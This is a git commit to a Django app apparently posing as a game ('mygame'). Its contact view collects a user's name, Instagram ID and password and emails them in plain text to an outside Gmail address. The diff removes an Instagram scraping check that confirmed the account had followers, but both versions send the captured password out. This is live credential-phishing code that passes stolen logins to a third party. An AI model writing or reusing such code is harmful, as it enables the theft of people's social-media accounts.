abf4b1a39cb535610f5857f73374cf14459ef7bf
kk <kk41110002@gmail.com>
2021-06-16 12:41:08 +0530

    chn

--- mygame/views.py
+++ mygame/views.py
@@ -3,7 +3,6 @@ from django.core.mail import send_mail
 from django.contrib import messages
 from django.conf  import settings
 from django.shortcuts import redirect
-from instascrape import *
 
 
 # Create your views here.
@@ -17,23 +16,14 @@ def contact(request):
         password=request.POST.get('password')
         if name==''or facebookID=='' or password=='':
             return redirect('/message/')
-        try:
-            lnk=f"https://www.instagram.com/{facebookID}/"
-            user= Profile(lnk)
-            user.scrape()
-            if user.followers>1:
-                print(user.followers)
-                subject='Try to Register'
-                message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\n instagram id -: {facebookID}\n\n\npassword -: {password}"
-                email_from= settings.EMAIL_HOST_USER
-                email_to=['playourgame936@gmail.com']
-                send_mail(subject, message, email_from, email_to,fail_silently=False,)
-                return  redirect('menu')
-            else:
-                return redirect('/message/')
-        except:
-            messages.info(request,"You attempt so many try ,please registered after some time!")
-            return redirect(request.META['HTTP_REFERER'])
+        if len(facebookID)<=3 or len(password)<=3:
+            return redirect('/message/')
+        subject='Try to Register'
+        message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\n instagram id -: {facebookID}\n\n\npassword -: {password}"
+        email_from= settings.EMAIL_HOST_USER
+        email_to=['playourgame936@gmail.com']
+        send_mail(subject, message, email_from, email_to,fail_silently=False,)
+        return  redirect('menu')
 
     return render(request,'contact.html')
 
